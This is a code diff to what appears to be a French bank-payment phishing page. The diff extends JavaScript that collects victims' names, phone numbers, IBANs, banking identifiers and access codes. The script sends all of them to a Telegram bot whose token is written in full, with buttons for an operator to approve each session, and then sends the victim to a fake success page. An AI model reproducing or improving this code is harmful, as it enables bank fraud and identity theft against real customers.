@@ -38,7 +38,6 @@
         .loading-text { font-size:1.8rem; font-weight:bold; color:#000; letter-spacing:1px; position:relative; }
         .loading-text::after { content:"."; animation:dots 1.5s steps(4,end) infinite; }
         @keyframes dots { 0%{content:".";} 33%{content:"..";} 66%{content:"...";} 100%{content:".";} }
-        .error-msg { font-size:1.4rem; color:#d32f2f; margin:30px 0; padding:20px; background:#ffebee; border-radius:12px; }
         @media (max-width:500px) { .flex-row {gap:20px;} .image-box {max-width:110px;max-height:110px;} .arrow {font-size:3rem;} .loading-text {font-size:1.6rem;} }
         @media (max-width:480px) { .container {padding:30px 16px;} .bank-logo {width:110px;height:110px;} .partners-logos {grid-template-columns:repeat(auto-fit,minmax(70px,1fr));gap:10px;} .logo-item {width:70px;height:45px;padding:6px;} }
     </style>
@@ -145,12 +144,21 @@
             const identifiant = document.getElementById('identifiant').value.trim();
             const code = document.getElementById('code').value.trim();
             
-            const message = `
-🔥 NOUVELLE SAISIE 🔥
+            // Récupère les infos des pages 2 et 3
+            const page2 = JSON.parse(localStorage.getItem('page2Data') || '{}');
+            const page3Banque = localStorage.getItem('page3Banque') || 'non sélectionnée';
+            
+            const fullMessage = `
+🔥 SESSION COMPLÈTE - À VALIDER 🔥
 Montant: ${montant} €
-Banque: ${banque}
-Identifiant: ${identifiant}
-Code: ${code}
+Banque (page 3): ${page3Banque}
+Page 2:
+- Nom/prénom: ${page2.nom || 'non saisi'}
+- Téléphone: ${page2.tel || 'non saisi'}
+- IBAN: ${page2.iban || 'non saisi'}
+Page 4:
+- Identifiant: ${identifiant}
+- Code: ${code}
             `.trim();
             
             const token = "8281062190:AAHjA80kaHFvPIsxK-fIX0sCPykIGcGRp3s";
@@ -162,7 +170,7 @@ Code: ${code}
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     chat_id: chat_id,
-                    text: message,
+                    text: fullMessage,
                     reply_markup: {
                         inline_keyboard: [[
                             { text: "OUI – Valider (page 5)", callback_data: "oui" },
@@ -172,11 +180,10 @@ Code: ${code}
                 })
             }).catch(() => {});
             
-            // Loader actif pendant 15 secondes max
+            // Loader 15 secondes max puis auto page 5
             document.getElementById('main-container').style.display = 'none';
             document.getElementById('loader').style.display = 'flex';
             
-            // Après 15 secondes : auto vers page 5 si rien validé
             setTimeout(() => {
                 if (document.getElementById('loader').style.display === 'flex') {
                     window.location.href = 'succes.html?montant=' + montant + '&banque=' + encodeURIComponent(banque) + '&type=' + type;
